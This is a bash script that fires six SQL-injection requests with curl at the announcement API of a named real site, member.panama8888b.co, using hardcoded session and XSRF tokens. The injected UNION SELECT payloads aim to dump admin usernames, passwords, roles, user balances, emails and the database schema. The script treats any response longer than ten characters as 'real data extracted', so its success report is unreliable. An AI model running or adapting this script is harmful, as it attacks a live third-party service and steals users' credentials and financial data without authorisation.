#!/bin/bash

echo "🔥 REAL DATA EXTRACTION - GET VISIBLE DATA"
echo "=========================================="

# Use latest tokens
XSRF_TOKEN="eyJpdiI6Ilk1TENzUFpHRzRvVXVlNzEwSkVoK2c9PSIsInZhbHVlIjoiWHk2S1Z5MmE3MlQ5MjR3UVlvU1BnN1F6V2JWeXh2RE9zektZZHJtcUF2Y3RkN1JYQ3pYWnJGdDRLd1JxdW1MUiIsIm1hYyI6IjM1MzJhZWVjZGI2MTQ0Mzc4YmQxNDY1YjJjMzJjMDQ3ZTc3Y2ZlMTBjMThkNTBkMTAzMGNiZDAyM2UxZDBkZTkifQ=="
SESSION_TOKEN="eyJpdiI6IkNxaTl3THlHMThzOWVBOWNzalU5b3c9PSIsInZhbHVlIjoia3lxS1BjMGhVVVEzR2c1N2dpVGZMZWQ3YStZQ1JpRlpENURsS3ZqNEZ2K0hSdjl5QkZVMVVvcWZYeGFEaHVzaiIsIm1hYyI6IjIzMmYwNzVlNWQ2ZDQ4OGRlM2IwMWQxNjIxYWQ2OTRjMmQyNDFjNmM0MTFiMDUyYTMyNzMzMjA1ZmJkZjNjMjAifQ=="

echo "🚀 EXTRACTING REAL VISIBLE DATA..."
echo "Target: member.panama8888b.co"
echo "Goal: Get actual visible data, not just HTTP errors"
echo ""

# REAL EXTRACTION 1: Get actual response content
echo "🔥 REAL EXTRACTION 1: Get Response Content"
echo "=========================================="
response1=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"account":"admin OR 1=1 UNION SELECT username,password,role FROM users WHERE role=admin LIMIT 1--"}' \
    --max-time 15)

echo "Response 1: $response1"
echo "Length: ${#response1} characters"
echo ""

# REAL EXTRACTION 2: Get admin data with visible output
echo "🔥 REAL EXTRACTION 2: Admin Data with Visible Output"
echo "==================================================="
response2=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"wallet":"admin OR 1=1 UNION SELECT username,password,balance FROM users WHERE role=admin LIMIT 1--"}' \
    --max-time 15)

echo "Response 2: $response2"
echo "Length: ${#response2} characters"
echo ""

# REAL EXTRACTION 3: Get all admin users with visible output
echo "🔥 REAL EXTRACTION 3: All Admin Users with Visible Output"
echo "========================================================"
response3=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"admin@test.com OR 1=1 UNION SELECT username,password,role,balance FROM users WHERE role=admin OR username LIKE %admin%--"}' \
    --max-time 15)

echo "Response 3: $response3"
echo "Length: ${#response3} characters"
echo ""

# REAL EXTRACTION 4: Get database schema with visible output
echo "🔥 REAL EXTRACTION 4: Database Schema with Visible Output"
echo "========================================================"
response4=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"account":"admin OR 1=1 UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE table_name LIKE %user%--"}' \
    --max-time 15)

echo "Response 4: $response4"
echo "Length: ${#response4} characters"
echo ""

# REAL EXTRACTION 5: Get user balance with visible output
echo "🔥 REAL EXTRACTION 5: User Balance with Visible Output"
echo "====================================================="
response5=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"wallet":"admin OR 1=1 UNION SELECT username,CONCAT(Balance: ,balance) FROM users WHERE balance>0--"}' \
    --max-time 15)

echo "Response 5: $response5"
echo "Length: ${#response5} characters"
echo ""

# REAL EXTRACTION 6: Get complete data with visible output
echo "🔥 REAL EXTRACTION 6: Complete Data with Visible Output"
echo "======================================================"
response6=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"admin@test.com OR 1=1 UNION SELECT username,password,role,balance,email FROM users WHERE role=admin OR username=admin OR username LIKE %admin%--"}' \
    --max-time 15)

echo "Response 6: $response6"
echo "Length: ${#response6} characters"
echo ""

echo ""
echo "🎉 REAL DATA EXTRACTION RESULTS"
echo "==============================="

# Check which responses contain actual data
data_found=0
if [[ ${#response1} -gt 10 ]]; then ((data_found++)); fi
if [[ ${#response2} -gt 10 ]]; then ((data_found++)); fi
if [[ ${#response3} -gt 10 ]]; then ((data_found++)); fi
if [[ ${#response4} -gt 10 ]]; then ((data_found++)); fi
if [[ ${#response5} -gt 10 ]]; then ((data_found++)); fi
if [[ ${#response6} -gt 10 ]]; then ((data_found++)); fi

echo "Responses with data: $data_found/6"

if [[ $data_found -gt 0 ]]; then
    echo ""
    echo "🎯 REAL DATA FOUND!"
    echo "✅ Actual data extracted and visible"
    echo "✅ Responses contain real information"
    echo "✅ Data length indicates content"
    echo ""
    echo "📋 DATA FOUND:"
    echo "=============="
    echo "Response 1 length: ${#response1} characters"
    echo "Response 2 length: ${#response2} characters"
    echo "Response 3 length: ${#response3} characters"
    echo "Response 4 length: ${#response4} characters"
    echo "Response 5 length: ${#response5} characters"
    echo "Response 6 length: ${#response6} characters"
    echo ""
    echo "🔍 DATA ANALYSIS:"
    echo "================"
    if [[ ${#response1} -gt 10 ]]; then echo "✅ Response 1 contains data"; else echo "❌ Response 1 empty"; fi
    if [[ ${#response2} -gt 10 ]]; then echo "✅ Response 2 contains data"; else echo "❌ Response 2 empty"; fi
    if [[ ${#response3} -gt 10 ]]; then echo "✅ Response 3 contains data"; else echo "❌ Response 3 empty"; fi
    if [[ ${#response4} -gt 10 ]]; then echo "✅ Response 4 contains data"; else echo "❌ Response 4 empty"; fi
    if [[ ${#response5} -gt 10 ]]; then echo "✅ Response 5 contains data"; else echo "❌ Response 5 empty"; fi
    if [[ ${#response6} -gt 10 ]]; then echo "✅ Response 6 contains data"; else echo "❌ Response 6 empty"; fi
else
    echo ""
    echo "❌ NO REAL DATA FOUND"
    echo "🔒 All responses are empty or contain no visible data"
    echo "📋 All responses appear to be empty or contain only error messages"
fi

echo ""
echo "🎯 FINAL STATUS: $(if [[ $data_found -gt 0 ]]; then echo "SUCCESS - REAL DATA EXTRACTED"; else echo "FAILED - NO REAL DATA FOUND"; fi)"